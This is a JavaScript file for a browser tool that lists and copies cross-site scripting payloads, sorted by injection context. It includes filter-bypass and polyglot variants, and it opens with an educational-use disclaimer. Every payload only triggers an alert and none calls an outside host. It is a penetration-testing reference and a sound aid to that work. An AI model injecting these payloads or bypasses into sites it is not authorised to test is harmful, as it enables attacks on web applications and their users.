/*
XSS Payload Library — CyberTools

DISCLAIMER / EDUCATIONAL USE ONLY

This project is created strictly for educational purposes, security research, and web application security awareness only.

I am not responsible for any misuse, damage, unauthorized access, illegal activity, or harmful actions caused by the use, modification, distribution, or execution of this code.

This code is intended to help understand Cross-Site Scripting (XSS) vulnerabilities from a defensive and analytical perspective, such as vulnerability testing in authorized environments, penetration testing with permission, secure coding practices, and security education.

It must NOT be used for attacking real websites, stealing data, session hijacking, bypassing security controls, unauthorized testing, or any illegal activity.

XSS is a dual-use security topic: it can be used for ethical security research or harmful abuse. This repository supports only legal, ethical, and educational use.

By using this code, you agree that you are solely responsible for your actions and compliance with all applicable laws and regulations.

Any malicious use is strictly against the intent of this project.
*/

const PAYLOADS = [
    { ctx:'HTML Body', payload:'<script>alert(1)<\/script>', note:'Classic script tag injection' },
    { ctx:'HTML Body', payload:'<img src=x onerror=alert(1)>', note:'Image onerror event handler' },
    { ctx:'HTML Body', payload:'<svg onload=alert(1)>', note:'SVG onload event' },
    { ctx:'HTML Body', payload:'<body onload=alert(1)>', note:'Body onload handler' },
    { ctx:'HTML Body', payload:'<iframe src="javascript:alert(1)"><\/iframe>', note:'JavaScript URI in iframe src' },
    { ctx:'HTML Body', payload:'<details open ontoggle=alert(1)>', note:'HTML5 details element ontoggle' },
    { ctx:'HTML Body', payload:'<video><source onerror=alert(1)>', note:'Video source onerror' },
    { ctx:'HTML Body', payload:'<input autofocus onfocus=alert(1)>', note:'Input autofocus with onfocus' },
    { ctx:'HTML Body', payload:'<marquee onstart=alert(1)>', note:'Marquee onstart (older browsers)' },
    { ctx:'HTML Body', payload:'<object data="javascript:alert(1)">', note:'Object tag with javascript: URI' },
    { ctx:'HTML Body', payload:'<embed src="javascript:alert(1)">', note:'Embed tag with javascript: URI' },
    { ctx:'HTML Body', payload:'<form><button formaction=javascript:alert(1)>Click', note:'Button formaction with javascript: URI' },
    { ctx:'HTML Attribute', payload:'" onmouseover="alert(1)', note:'Break out of attribute, add event handler' },
    { ctx:'HTML Attribute', payload:"' onfocus='alert(1)' autofocus='", note:'Single-quote breakout with autofocus' },
    { ctx:'HTML Attribute', payload:'javascript:alert(1)', note:'href or action attribute with javascript: URI' },
    { ctx:'HTML Attribute', payload:'" style="x:expression(alert(1))', note:'CSS expression (IE only)' },
    { ctx:'HTML Attribute', payload:'`onmouseover=alert(1) `', note:'Backtick delimiter in some parsers' },
    { ctx:'HTML Attribute', payload:'" onload="alert(1)" x="', note:'Inject onload in any attribute context' },
    { ctx:'JavaScript', payload:"';alert(1)//", note:'Break out of single-quoted JS string' },
    { ctx:'JavaScript', payload:'";alert(1)//', note:'Break out of double-quoted JS string' },
    { ctx:'JavaScript', payload:'`${alert(1)}`', note:'Template literal injection' },
    { ctx:'JavaScript', payload:'<\/script><script>alert(1)<\/script>', note:'Close script tag and open new one' },
    { ctx:'JavaScript', payload:"\\u0022;alert(1)//", note:'Unicode escape to break out of string' },
    { ctx:'JavaScript', payload:'-alert(1)-', note:'Math expression injection' },
    { ctx:'URL', payload:'javascript:alert(1)', note:'JavaScript URI in href/src/action' },
    { ctx:'URL', payload:'%3Cscript%3Ealert(1)%3C/script%3E', note:'URL-encoded script tag' },
    { ctx:'URL', payload:'data:text/html,<script>alert(1)<\/script>', note:'data: URI with HTML' },
    { ctx:'URL', payload:'javascript:void(alert(1))', note:'void() wrapper sometimes bypasses filters' },
    { ctx:'SVG', payload:'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>', note:'SVG onload (standalone file)' },
    { ctx:'SVG', payload:'<svg><script>alert(1)<\/script><\/svg>', note:'Script inside SVG' },
    { ctx:'SVG', payload:'<svg><animate onbegin=alert(1) attributeName=x dur=1s>', note:'SVG animation onbegin' },
    { ctx:'SVG', payload:'<svg><set onbegin=alert(1) attributeName=x>', note:'SVG set onbegin' },
    { ctx:'Filter Bypass', payload:'<ScRiPt>alert(1)<\/sCrIpT>', note:'Mixed case to bypass case-sensitive filters' },
    { ctx:'Filter Bypass', payload:'<script>alert`1`<\/script>', note:'Backtick call to bypass parenthesis filter' },
    { ctx:'Filter Bypass', payload:'<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>', note:'HTML entity encoding in event handler' },
    { ctx:'Filter Bypass', payload:'<svg/onload=alert(1)>', note:'No space before onload' },
    { ctx:'Filter Bypass', payload:'<img src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))">', note:'Base64 encoded payload in atob()' },
    { ctx:'Filter Bypass', payload:'<<script>alert(1)//<\/script>', note:'Double open bracket for some parsers' },
    { ctx:'Filter Bypass', payload:'<img src=1 href=1 onerror="javascript:alert(1)">', note:'Multiple src attributes to confuse parser' },
    { ctx:'Filter Bypass', payload:'<script>/**/alert(1)/**/<\/script>', note:'Comments inside script to bypass keyword filter' },
    { ctx:'Filter Bypass', payload:'<a href="&#106;avascript:alert(1)">click</a>', note:'HTML entity on first char of javascript:' },
    { ctx:'Filter Bypass', payload:'<a href="jav\tascript:alert(1)">click</a>', note:'Tab character inside javascript: URI' },
    { ctx:'Filter Bypass', payload:'<iframe srcdoc="<script>alert(1)<\/script>">', note:'srcdoc attribute bypasses src filters' },
    { ctx:'Polyglot', payload:"jaVasCript:/*-/*`/*`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>", note:'Polyglot XSS payload (Gareth Heyes) — works in many contexts' },
    { ctx:'Polyglot', payload:"'\"()&%<acx><ScRiPt>alert(1)<\/ScRiPt>", note:'Multi-context fuzzing payload' },
    { ctx:'Polyglot', payload:'">\'><img src=x onerror=alert(1)>', note:'Quote/bracket breakout polyglot' },
    { ctx:'Polyglot', payload:'<script>alert(1)<\/script><img src=x onerror=alert(2)>', note:'Dual-vector polyglot' },
];

const CATEGORIES = ['All', 'HTML Body', 'HTML Attribute', 'JavaScript', 'URL', 'SVG', 'Filter Bypass', 'Polyglot'];
const CTX_COLORS = {
    'HTML Body': 'var(--accent)',
    'HTML Attribute': 'var(--accent-2)',
    'JavaScript': 'var(--warning)',
    'URL': '#a78bfa',
    'SVG': '#34d399',
    'Filter Bypass': 'var(--danger)',
    'Polyglot': '#f472b6',
};

let activeCtx = 'All';

function initTabs() {
    const tabsEl = document.getElementById('filter-tabs');
    tabsEl.innerHTML = CATEGORIES.map(c =>
        `<button onclick="setCtx('${c}')" id="tab-${c.replace(/\s/g,'-')}" style="padding:6px 14px;border-radius:20px;font-size:12px;font-weight:600;cursor:pointer;border:1px solid var(--border);background:${c==='All'?'var(--accent)':'var(--surface-2)'};color:${c==='All'?'var(--bg)':'var(--text-muted)'};">${escHtml(c)}</button>`
    ).join('');
}

function setCtx(ctx) {
    activeCtx = ctx;
    CATEGORIES.forEach(c => {
        const btn = document.getElementById('tab-' + c.replace(/\s/g,'-'));
        if (!btn) return;
        btn.style.background = c === ctx ? 'var(--accent)' : 'var(--surface-2)';
        btn.style.color = c === ctx ? 'var(--bg)' : 'var(--text-muted)';
    });
    render();
}

function render() {
    const q = (document.getElementById('search').value || '').toLowerCase().trim();
    const filtered = PAYLOADS.filter(p => {
        if (activeCtx !== 'All' && p.ctx !== activeCtx) return false;
        if (!q) return true;
        return p.payload.toLowerCase().includes(q) || p.note.toLowerCase().includes(q) || p.ctx.toLowerCase().includes(q);
    });
    document.getElementById('count').textContent = `${filtered.length} payload${filtered.length !== 1 ? 's' : ''}`;

    if (!filtered.length) {
        document.getElementById('payloads-list').innerHTML = '<p style="color:var(--text-muted);font-size:14px;">No payloads match your search.</p>';
        return;
    }

    let html = '';
    filtered.forEach(p => {
        const color = CTX_COLORS[p.ctx] || 'var(--text-muted)';
        html += `<div style="background:var(--surface);border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:12px;">
            <div style="display:flex;align-items:center;justify-content:space-between;padding:10px 14px;border-bottom:1px solid var(--border);">
                <span style="font-size:11px;font-weight:700;letter-spacing:.06em;color:${color};">${escHtml(p.ctx)}</span>
                <button onclick="copyPayload(this)" data-payload="${escAttr(p.payload)}" style="background:var(--surface-2);border:1px solid var(--border);border-radius:5px;padding:4px 10px;font-size:12px;font-weight:600;color:var(--text-muted);cursor:pointer;">Copy</button>
            </div>
            <pre style="margin:0;padding:12px 14px;font-family:'JetBrains Mono',monospace;font-size:13px;color:var(--text);white-space:pre-wrap;word-break:break-all;">${escHtml(p.payload)}</pre>
            <div style="padding:8px 14px;border-top:1px solid var(--border);font-size:12px;color:var(--text-muted);">${escHtml(p.note)}</div>
        </div>`;
    });
    document.getElementById('payloads-list').innerHTML = html;
}

function copyPayload(btn) {
    const payload = btn.getAttribute('data-payload');
    navigator.clipboard.writeText(payload).then(() => {
        const orig = btn.textContent;
        btn.textContent = 'Copied!';
        btn.style.color = 'var(--accent)';
        setTimeout(() => { btn.textContent = orig; btn.style.color = ''; }, 1500);
    }).catch(() => {});
}

function escHtml(s) {
    const d = document.createElement('div');
    d.textContent = s;
    return d.innerHTML;
}

function escAttr(s) {
    return s.replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/'/g,'&#39;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}
